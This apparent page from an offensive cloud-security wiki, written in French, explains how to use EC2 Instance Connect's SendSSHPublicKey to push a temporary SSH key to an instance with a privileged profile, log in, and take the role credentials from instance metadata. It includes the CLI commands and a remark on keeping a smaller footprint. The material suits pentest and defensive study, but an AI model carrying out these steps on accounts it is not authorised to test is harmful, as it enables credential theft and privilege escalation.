---
title: "Instance Connect : pousser une clé SSH temporaire vers une instance privilégiée"
order: 2
description: "ec2-instance-connect:SendSSHPublicKey pour pousser une clé temporaire vers une instance portant un profil privilégié et s'y connecter."
keywords:
  - EC2 Instance Connect
  - SendSSHPublicKey
  - SSH
  - profil d'instance
  - connexion
---

# Instance Connect

EC2 Instance Connect pousse une clé publique SSH éphémère vers les métadonnées d'une instance en cours d'exécution, pour une fenêtre de connexion de 60 secondes. `ec2-instance-connect:SendSSHPublicKey` contre une instance qui porte un **profil d'instance** privilégié vous ouvre un shell sur celle-ci, où IMDS distribue les identifiants du rôle du profil.

## Pousser une clé et se connecter

```bash
aws ec2-instance-connect send-ssh-public-key \
  --instance-id <id> --instance-os-user ec2-user \
  --ssh-public-key "$(cat ~/.ssh/id_ed25519.pub)"
ssh ec2-user@<instance-ip>        # within 60s of the push
# on the box, read the profile role creds from IMDS
```

## Notes d'exploitation

- Il vous faut une accessibilité réseau vers l'instance (IP publique ou une route vers elle), ainsi que `SendSSHPublicKey` et une instance exécutant l'agent Instance Connect.
- Une fois sur l'hôte, la récupération des identifiants du rôle suit [métadonnées d'instance](../../../credentials/instance-metadata/index.md).
- La clé poussée est éphémère, ce qui réduit l'empreinte par rapport à l'édition d'`authorized_keys`.

## Outils

- **AWS CLI** (`ec2-instance-connect send-ssh-public-key`).

## Références

- [AWS: EC2 Instance Connect](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-connect-methods.html)
- [HackTricks Cloud: AWS EC2 privesc](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-ec2-ebs-ssm-and-vpc-enum.html)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
